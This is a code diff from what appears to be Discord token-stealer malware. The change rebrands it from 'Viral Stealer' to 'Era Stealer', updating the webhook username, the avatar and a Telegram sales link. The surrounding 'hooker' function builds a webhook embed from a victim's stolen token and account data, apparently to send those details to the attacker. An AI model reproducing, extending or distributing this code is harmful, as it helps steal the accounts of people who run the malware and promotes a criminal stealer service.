@@ -84,15 +84,15 @@ const request = async (method, url, headers, data) => {
 };
 
 const hooker = async (content, token, account) => {
-  content["username"] = "Viral Injection";
-  content["avatar_url"] = "https://cdn.discordapp.com/attachments/1298607382783459380/1300901478499745822/GHBuOJJXIAAAdZF.webp?ex=6722866a&is=672134ea&hm=47097fc11cbec4f30a13f682189fe6ed9b5d5ab5d42844ff4abd0de17b31d0d9&";
+  content["username"] = "Era Injection";
+  content["avatar_url"] = "https://cdn.discordapp.com/attachments/1329073689907560499/1333804141545263199/era.jpg?ex=679a3968&is=6798e7e8&hm=627edebd37fde5428a8638466cff6c79b13cf148379447565de10600191735e3&";
 
   content["embeds"][0]["thumbnail"] = {
     url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`,
   };
   content["embeds"][0]["footer"] = {
-    text: "Viral Stealer | https://t.me/viralstealer",
-    icon_url: "https://cdn.discordapp.com/attachments/1298607382783459380/1300901478499745822/GHBuOJJXIAAAdZF.webp?ex=6722866a&is=672134ea&hm=47097fc11cbec4f30a13f682189fe6ed9b5d5ab5d42844ff4abd0de17b31d0d9&",
+    text: "Era Stealer | https://t.me/era_stealer",
+    icon_url: "https://cdn.discordapp.com/attachments/1329073689907560499/1333804141545263199/era.jpg?ex=679a3968&is=6798e7e8&hm=627edebd37fde5428a8638466cff6c79b13cf148379447565de10600191735e3&",
   };
   content["embeds"][0]["title"] = content["name"];
 
